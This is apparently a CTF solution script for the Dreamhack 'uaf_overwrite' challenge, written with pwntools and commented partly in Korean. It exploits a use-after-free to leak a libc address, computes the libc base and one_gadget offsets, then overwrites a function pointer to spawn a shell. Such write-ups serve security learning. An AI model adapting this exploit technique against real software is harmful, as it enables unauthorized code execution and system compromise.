# Name: uaf_overwrite.py
from pwn import *
p = process("./uaf_overwrite")
#p = remote("host1.dreamhack.games", 18439)

def slog(sym, val): success(sym + ": " + hex(val))
def human(weight, age):
    p.sendlineafter(">", "1")
    p.sendlineafter(": ", str(weight))
    p.sendlineafter(": ", str(age))
def robot(weight):
    p.sendlineafter(">", "2")
    p.sendlineafter(": ", str(weight))
def custom(size, data, idx):
    p.sendlineafter(">", "3")
    p.sendlineafter(": ", str(size))
    p.sendafter(": ", data)
    p.sendlineafter(": ", str(idx))
# UAF to calculate the `libc_base`
custom(0x500, "AAAA", -1) #custom[-1]에는 0x0000000000000000 이라서 if문을 만족하지 않는다.
custom(0x500, "AAAA", -1)
custom(0x500, "AAAA", 0)
custom(0x500, "B", -1)
main_arena_plusAlpha = u64(p.recvline()[:-1].ljust(8, b"\x00"))
slog("main_arena_plusAlpha", main_arena_plusAlpha)
lb = main_arena_plusAlpha - 0x3ebc42 #libc-2.27.so
#lb = main_arena_plusAlpha - 0x1ECB42 #libc-2.31.so
# 0x4f3d5 0x4f432 0x10a41c   libc-2.27.so의 one_gadget
# 0xe3b2e 0xe3b31 0xe3b34    libc-2.31.so의 one_gadget
og = lb + 0x10a41c
slog("libc_base", lb)
slog("one_gadget", og)

# UAF to manipulate `robot->fptr` & get shell
human("1", og)
robot("1")
p.interactive()